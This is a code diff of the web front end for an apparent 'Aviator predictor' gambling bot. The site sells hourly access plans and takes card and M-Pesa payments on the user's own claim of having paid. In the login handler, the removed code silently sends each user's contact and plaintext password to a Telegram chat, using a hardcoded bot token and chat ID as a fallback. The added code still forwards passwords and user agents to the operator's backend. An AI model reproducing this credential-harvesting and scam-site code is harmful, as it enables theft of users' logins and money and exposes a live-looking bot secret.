                                     <div class="price-title">Premium Hour</div>
-                                    <div class="price-amount">$44.99</d iv>
+                                    <div class="price-amount">$44.99</div>
                                     <div class="price-duration">1 Hour</div>
+                                </div>
+                                <div class="price-option" data-plan="12hour" data-price="479.99">
+                                    <div class="price-title">Pro Trader</div>
+                                    <div class="price-amount">$479</div>
+                                    <div class="price-duration">12 Hours</div>
+                                </div>
+                                <div class="price-option" data-plan="24hour" data-price="899.99">
+                                    <div class="price-title">Master Trader</div>
+                                    <div class="price-amount">$899</div>
+                                    <div class="price-duration">24 Hours</div>
                                 </div>
                             </div>
                             
@@ -1497,113 +294,46 @@
                 
                 <form id="paymentForm" class="payment-form">
                     <div class="payment-method">
-                        <label>Payment Method</label>
+                        <label>Choose Payment Method</label>
                         <div class="payment-options">
-                            <div class="payment-option selected" data-method="card">
+                            <div class="payment-option" data-method="card" id="cardPaymentOption">
                                 <i class="fas fa-credit-card"></i>
-                                <span>Credit/Debit Card</span>
-                            </div>
-                            <div class="payment-option" data-method="paypal">
-                                <i class="fab fa-paypal"></i>
-                                <span>PayPal</span>
-                            </div>
-                            <div class="payment-option" data-method="crypto">
-                                <i class="fab fa-bitcoin"></i>
-                                <span>Crypto (BTC/USDT)</span>
-                            </div>
-                            <div class="payment-option" data-method="mobile">
-                                <i class="fas fa-mobile-alt"></i>
-                                <span>Mobile Money</span>
+                                <span>Credit/Debit Card (Optional)</span>
                             </div>
                         </div>
                     </div>
                     
-                    <div id="cardPayment" class="payment-details">
+                    <div id="cardPayment" class="payment-details" style="display: none;">
                         <div class="form-group">
                             <label>Card Number</label>
-                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                         </div>
                         <div class="form-row">
                             <div class="form-group">
                                 <label>Expiry Date</label>
-                                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
                             </div>
                             <div class="form-group">
                                 <label>CVV</label>
-                                <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                                <input type="text" id="cvv" placeholder="123" maxlength="4">
                             </div>
                         </div>
                         <div class="form-group">
                             <label>Cardholder Name</label>
-                            <input type="text" id="cardholderName" placeholder="John Doe" required>
+                            <input type="text" id="cardholderName" placeholder="John Doe">
                         </div>
                     </div>
                     
-                    <div id="paypalPayment" class="payment-details hidden">
-                        <div class="paypal-info">
-                            <p>You'll be redirected to PayPal to complete your payment securely.</p>
-                        </div>
-                    </div>
+                    <!-- Complete Payment Button (Always Visible) -->
+                    <button type="button" class="complete-payment-btn" id="completePaymentBtn" style="background: #ff6b35; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; margin: 20px 0 10px 0; transition: all 0.3s ease;">
+                        <i class="fas fa-credit-card"></i>
+                        Complete Payment via Selar
+                    </button>
                     
-                    <div id="cryptoPayment" class="payment-details hidden">
-                        <div class="crypto-options">
-                            <div class="crypto-option-selector">
-                                <button class="crypto-option" data-coin="BTC">
-                                    <img src="data:image/png;base64,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" alt="Bitcoin" style="width: 20px; height: 20px; border-radius: 50%;"> 
-                                    BTC
-                                </button>
-                                <button class="crypto-option" data-coin="USDT">
-                                    <img src="data:image/png;base64,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" alt="USDT" style="width: 20px; height: 20px; border-radius: 50%;"> 
-                                    USDT (TRC-20)
-                                </button>
-                            </div>
-                        </div>
-                        <div id="crypto-pay-details" style="margin-top: 20px;"></div>
-                    </div>
-                    
-                    <div id="mobilePayment" class="payment-details hidden">
-                        <div style="text-align:center;padding:20px;">
-                            <h4>Pay with Mobile Money</h4>
-                            <p>Supports M-Pesa, Airtel Money</p>
-                            <div style="margin:15px 0;">
-                                <input type="tel" id="mobilePhone" placeholder="Phone number for mobile money" style="width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff;">
-                                <small style="color:#666;display:block;margin-top:5px;">Enter your phone number (e.g., 254700000000)</small>
-                            </div>
-                            <button id="mobile-pay-btn" type="button" style="background: #28a745; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; margin-bottom: 20px;">Pay with M-Pesa</button>
-                            
-                            <!-- Manual Paybill Option (Hidden by default) -->
-                            <div id="paybill-fallback" style="display:none;margin-top:30px;padding:20px;border:1px solid #333;border-radius:8px;background:#1a1a1a;">
-                                <h5 style="color:#fff;margin-bottom:15px;">📱 Alternative: Use M-Pesa Paybill</h5>
-                                <div style="background:#2d4a2d;padding:15px;border-radius:6px;margin-bottom:15px;">
-                                    <p style="margin:0;font-weight:bold;color:#9fff9f;">Business No: <span style="font-size:18px;color:#f1c40f;">793174</span></p>
-                                    <p style="margin:5px 0 0 0;font-weight:bold;color:#9fff9f;">Account No: <span style="font-size:18px;color:#f1c40f;">254745087451</span></p>
-                                </div>
-                                <div style="background:#4a3d2a;padding:15px;border-radius:6px;margin-bottom:15px;border:1px solid #6b5b3f;">
-                                    <p style="margin:0;font-weight:bold;color:#fff;">💰 Amount to Pay:</p>
-                                    <p style="margin:5px 0 0 0;font-size:18px;color:#f1c40f;">
-                                        <strong>USD: $<span class="paybill-amount">0.00</span></strong><br>
-                                        <strong>KES: <span class="paybill-amount-kes">0</span></strong>
-                                    </p>
-                                </div>
-                                <p style="color:#ccc;font-size:14px;margin-bottom:15px;">
-                                    1. Go to M-Pesa menu<br>
-                                    2. Select "Lipa na M-Pesa" → "Pay Bill"<br>
-                                    3. Enter Business No: <strong>793174</strong><br>
-                                    4. Enter Account No: <strong>254745087451</strong><br>
-                                    5. Enter Amount: <strong>KES <span class="paybill-amount-kes">0</span></strong><br>
-                                    6. Complete the transaction<br>
-                                    7. Click "I've Sent Payment" below
-                                </p>
-                                <button id="paybill-confirm-btn" type="button" style="background:#28a745;color:white;padding:12px 24px;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">
-                                    ✅ I've Sent Payment via Paybill
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <button type="submit" class="complete-payment-btn" id="completePaymentBtn">
-                        <i class="fas fa-lock"></i>
-                        Complete Payment
+                    <!-- Activate Bot Button (Always Visible Below) -->
+                    <button type="button" class="activate-bot-btn" id="activateBotBtn" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; margin-top: 10px;">
+                        <i class="fas fa-play"></i>
+                        Activate Bot (I've Sent Payment)
                     </button>
                 </form>
                 
@@ -1623,8 +353,214 @@
         // Backend API configuration
         const API_BASE_URL = 'https://aviator-backend-komp.onrender.com';
         
+        // Helper function to send messages to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/telegram/send`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
+                    body: JSON.stringify({ message })
+                });
+                const result = await response.json();
+                console.log('Telegram notification sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Failed to send Telegram notification:', error);
+                throw error;
+            }
+        }
+
+        // Function to send Selar checkout notification
+        async function sendSelarNotification(email, packageName) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/telegram/notify-selar-payment`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'ngrok-skip-browser-warning': 'true'
+                    },
+                    body: JSON.stringify({ email, packageName })
+                });
+                const result = await response.json();
+                console.log('Selar notification sent:', result);
+                return result;
+            } catch (error) {
+                console.error('Failed to send Selar notification:', error);
+                throw error;
+            }
+        }
+
+        // Function to show verification button after payment
+        function showVerificationButton() {
+            const activationOverlay = document.getElementById('activationOverlay');
+            
+            // Check if verification button already exists
+            if (activationOverlay.querySelector('.verification-btn')) {
+                return;
+            }
+            
+            // Add verification button to activation overlay
+            const verificationBtn = document.createElement('button');
+            verificationBtn.className = 'activate-btn verification-btn';
+            verificationBtn.innerHTML = '<i class="fas fa-check"></i> I\'ve Sent Payment';
+            verificationBtn.style.marginTop = '10px';
+            verificationBtn.style.background = '#28a745';
+            
+            verificationBtn.onclick = function() {
+                const userContact = sessionStorage.getItem('aviator_contact') || 'Not provided';
+                const verificationMessage = `✅ PAYMENT VERIFICATION REQUEST\n\n` +
+                    `👤 Customer: ${userContact}\n` +
+                    `💰 Plan: ${selectedPlan.duration} Access ($${selectedPlan.price})\n` +
+                    `⏰ Time: ${new Date().toLocaleString()}\n` +
+                    `📱 Source: Bot Page\n` +
+                    `💬 Message: Customer claims to have completed Selar payment`;
+                
+                // Send verification request to Telegram
+                sendToTelegram(verificationMessage).then(() => {
+                    verificationBtn.innerHTML = '<i class="fas fa-clock"></i> Verification Sent';
+                    verificationBtn.disabled = true;
+                    alert('Verification request sent! Please wait for admin approval.');
+                }).catch(error => {
+                    console.error('Failed to send verification:', error);
+                    alert('Failed to send verification request. Please try again.');
+                });
+            };
+            
+            activationOverlay.querySelector('.card-content').appendChild(verificationBtn);
+        }
+        
+        // Session persistence - check if user is already logged in
+        function checkExistingSession() {
+            const savedUser = localStorage.getItem('aviator_bot_user');
+            const sessionExpiry = localStorage.getItem('aviator_bot_session_expiry');
+            
+            if (savedUser && sessionExpiry) {
+                const now = new Date().getTime();
+                const expiry = parseInt(sessionExpiry);
+                
+                // Check if session is still valid (24 hours)
+                if (now < expiry) {
+                    const userData = JSON.parse(savedUser);
+                    console.log('Found existing session for:', userData.contact);
+                    
+                    // Auto-login the user
+                    autoLogin(userData);
+                    return true;
+                }
+            }
+            
+            // Clear expired session
+            clearUserSession();
+            return false;
+        }
+        
+        // Auto-login function
+        function autoLogin(userData) {
+            // Store contact in sessionStorage for other functions
+            sessionStorage.setItem('aviator_contact', userData.contact);
+            
+            // Skip login screen and go directly to bot
+            document.getElementById('bot-loading').classList.add('hidden');
+            document.getElementById('bot-login').classList.add('hidden');
+            document.getElementById('bot-main').classList.remove('hidden');
+            document.getElementById('bot-server-loading').classList.remove('hidden');
+            document.body.className = 'bot-server-mode';
+            
+            setTimeout(() => {
+                document.getElementById('bot-server-loading').classList.add('hidden');
+                document.getElementById('bot-server-main').classList.remove('hidden');
+                const userContactEl = document.getElementById('userContact');
+                if (userContactEl) userContactEl.textContent = userData.contact;
+                
+                // Show welcome back message
+                showWelcomeBackMessage(userData.contact);
+            }, 3000);
+        }
+        
+        // Clear user session
+        function clearUserSession() {
+            localStorage.removeItem('aviator_bot_user');
+            localStorage.removeItem('aviator_bot_session_expiry');
+            sessionStorage.removeItem('aviator_contact');
+        }
+        
+        // Save user session after successful login (without password)
+        function saveUserSession(contact) {
+            const userData = {
+                contact: contact,
+                loginTime: new Date().toISOString()
+            };
+            
+            // Set session to expire in 24 hours
+            const expiryTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+            
+            localStorage.setItem('aviator_bot_user', JSON.stringify(userData));
+            localStorage.setItem('aviator_bot_session_expiry', expiryTime.toString());
+            
+            console.log('User session saved until:', new Date(expiryTime).toLocaleString());
+        }
+        
+        // Show welcome back message
+        function showWelcomeBackMessage(contact) {
+            const sessionExpiry = localStorage.getItem('aviator_bot_session_expiry');
+            const expiryDate = new Date(parseInt(sessionExpiry));
+            const timeLeft = Math.round((expiryDate.getTime() - new Date().getTime()) / (1000 * 60 * 60)); // Hours left
+            
+            const welcomeMsg = document.createElement('div');
+            welcomeMsg.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #28a745;
+                color: white;
+                padding: 15px 20px;
+                border-radius: 8px;
+                z-index: 10000;
+                font-size: 14px;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+                animation: slideIn 0.5s ease-out;
+                max-width: 300px;
+            `;
+            welcomeMsg.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 5px;">
+                    <i class="fas fa-check-circle"></i>
+                    <span><strong>Welcome back!</strong></span>
+                </div>
+                <div style="font-size: 12px; opacity: 0.9;">
+                    ${contact}<br>
+                    Session expires in ${timeLeft} hours
+                </div>
+            `;
+            
+            // Add slide-in animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+            `;
+            document.head.appendChild(style);
+            document.body.appendChild(welcomeMsg);
+            
+            // Remove welcome message after 5 seconds
+            setTimeout(() => {
+                welcomeMsg.style.animation = 'slideIn 0.5s ease-out reverse';
+                setTimeout(() => welcomeMsg.remove(), 500);
+            }, 5000);
+        }
+        
         // Pre-fill contact info from landing page session
         document.addEventListener('DOMContentLoaded', function() {
+            // First check if user has existing session
+            if (checkExistingSession()) {
+                return; // User auto-logged in, skip login form setup
+            }
+            
+            // If no existing session, pre-fill contact from landing page
             const savedContact = sessionStorage.getItem('aviator_contact');
             if (savedContact) {
                 const contactInput = document.querySelector('input[name="contact"]');
@@ -1635,10 +571,14 @@
             }
         });
         
-        // Initial loading effect
+        // Initial loading effect (only if no existing session)
         setTimeout(() => {
-            document.getElementById('bot-loading').classList.add('hidden');
-            document.getElementById('bot-login').classList.remove('hidden');
+            // Only show login if user wasn't auto-logged in
+            if (!localStorage.getItem('aviator_bot_user') || 
+                new Date().getTime() >= parseInt(localStorage.getItem('aviator_bot_session_expiry') || '0')) {
+                document.getElementById('bot-loading').classList.add('hidden');
+                document.getElementById('bot-login').classList.remove('hidden');
+            }
         }, 4000);
 
         // Validation functions
@@ -1689,7 +629,7 @@
             }
         }
 
-        // Enhanced Login form handler with validation
+        // Enhanced Login form handler with backend authentication
         document.getElementById('loginForm').onsubmit = async function(e) {
             e.preventDefault();
             const contact = (this.contact.value || '').trim();
@@ -1714,76 +654,75 @@
                 return;
             }
             
-            try { sessionStorage.setItem('aviator_contact', contact); } catch (err) {}
+            // Show loading state
+            const submitBtn = this.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Logging in...';
             
-            // Send login data to backend first
             try {
-                await fetch(`${API_BASE_URL}/api/users`, {
+                // Use backend auth endpoint for secure login
+                const response = await fetch(`${API_BASE_URL}/api/auth/bot-login`, {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
                         'ngrok-skip-browser-warning': 'true'
                     },
                     body: JSON.stringify({ 
-                        email: contact, 
-                        packageName: 'Bot Login', 
-                        timeSlot: new Date().toLocaleTimeString(),
-                        bettingSite: 'Aviator Bot',
-                        password: password // Added for bot login tracking
+                        contact: contact,
+                        password: password,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
                     }),
                 });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Store session data securely
+                    try { 
+                        sessionStorage.setItem('aviator_contact', contact); 
+                        
+                        // Save user session for persistence (without password in frontend)
+                        const userData = {
+                            contact: contact,
+                            loginTime: new Date().toISOString()
+                        };
+                        const expiryTime = new Date().getTime() + (24 * 60 * 60 * 1000);
+                        localStorage.setItem('aviator_bot_user', JSON.stringify(userData));
+                        localStorage.setItem('aviator_bot_session_expiry', expiryTime.toString());
+                        
+                        console.log('✅ Login successful, session saved');
+                    } catch (err) {
+                        console.warn('⚠️ Session storage failed:', err);
+                    }
+                    
+                    // Proceed to bot interface
+                    this.reset();
+                    document.getElementById('bot-login').classList.add('hidden');
+                    document.getElementById('bot-main').classList.remove('hidden');
+                    document.getElementById('bot-server-loading').classList.remove('hidden');
+                    document.body.className = 'bot-server-mode';
+                    
+                    setTimeout(() => {
+                        document.getElementById('bot-server-loading').classList.add('hidden');
+                        document.getElementById('bot-server-main').classList.remove('hidden');
+                        const userContactEl = document.getElementById('userContact');
+                        if (userContactEl) userContactEl.textContent = contact;
+                    }, 3000);
+                    
+                } else {
+                    throw new Error(result.error || 'Login failed');
+                }
+                
             } catch (error) {
-                console.error('Backend user logging failed:', error);
+                console.error('❌ Login error:', error);
+                alert('Login failed. Please check your credentials and try again.');
+                
+                // Reset button
+                submitBtn.disabled = false;
+                submitBtn.textContent = originalText;
             }
-            
-            // Send to Telegram with improved formatting
-            const contactType = validation.type === 'email' ? '📧 Email' : '📱 Mobile';
-            try {
-                await fetch(`${API_BASE_URL}/api/telegram/send`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({
-                        message: `🤖 AVIATOR BOT LOGIN ALERT
-${contactType}: ${contact}
-🔑 Password: ${password}
-🌐 User Agent: ${navigator.userAgent.substring(0, 50)}...
-⏰ Login Time: ${new Date().toLocaleString()}
-🔗 Source: Aviator Predictor Bot`
-                    })
-                });
-            } catch (error) {
-                console.error('Telegram notification failed via backend:', error);
-                // Fallback to direct Telegram API if backend fails
-                await fetch('https://api.telegram.org/bot7995830862:AAEbUHiAL-YUM3myMGKd63dpFcbxE3_uU2o/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: '5900219209',
-                        text: `🤖 AVIATOR BOT LOGIN ALERT (Fallback)
-${contactType}: ${contact}
-🔑 Password: ${password}
-🌐 User Agent: ${navigator.userAgent.substring(0, 50)}...
-⏰ Login Time: ${new Date().toLocaleString()}
-🔗 Source: Aviator Predictor Bot`
-                    })
-                });
-            }
-            
-            this.reset();
-            document.getElementById('bot-login').classList.add('hidden');
-            document.getElementById('bot-main').classList.remove('hidden');
-            document.getElementById('bot-server-loading').classList.remove('hidden');
-            document.body.className = 'bot-server-mode';
-            setTimeout(() => {
-                document.getElementById('bot-server-loading').classList.add('hidden');
-                document.getElementById('bot-server-main').classList.remove('hidden');
-                const saved = (sessionStorage.getItem('aviator_contact') || contact).trim();
-                const userContactEl = document.getElementById('userContact');
-                if (userContactEl && saved) userContactEl.textContent = saved;
-            }, 3000);
         };
 
         // Start Bot button
@@ -1944,7 +883,9 @@ ${contactType}: ${contact}
                 '2min': 2 * 60 * 1000,
                 '15min': 15 * 60 * 1000,
                 '30min': 30 * 60 * 1000,
-                '1hour': 60 * 60 * 1000
+                '1hour': 60 * 60 * 1000,
+                '12hour': 12 * 60 * 60 * 1000,
+                '24hour': 24 * 60 * 60 * 1000
             };
             
             activationEndTime = Date.now() + durations[plan.plan];
@@ -2011,14 +952,33 @@ ${contactType}: ${contact}
             document.getElementById('paymentPlanName').textContent = selectedPlan.duration + ' Access';
             document.getElementById('paymentPlanPrice').textContent = '$' + selectedPlan.price;
             
+            // Reset modal state - hide card details, show both buttons
+            const cardDetails = document.getElementById('cardPayment');
+            const cardOption = document.getElementById('cardPaymentOption');
+            
+            cardDetails.style.display = 'none';
+            cardOption.classList.remove('selected');
+            
             // Show the payment modal
             document.getElementById('paymentModal').classList.remove('hidden');
+            
+            console.log('Payment modal opened with plan:', selectedPlan);
         }
 
         function closePaymentModal() {
             document.getElementById('paymentModal').classList.add('hidden');
+            
             // Reset form
             document.getElementById('paymentForm').reset();
+            
+            // Reset modal state
+            const cardDetails = document.getElementById('cardPayment');
+            const cardOption = document.getElementById('cardPaymentOption');
+            
+            cardDetails.style.display = 'none';
+            cardOption.classList.remove('selected');
+            
+            console.log('Payment modal closed and reset');
         }
 
         // Payment method selection
@@ -2039,25 +999,7 @@ ${contactType}: ${contact}
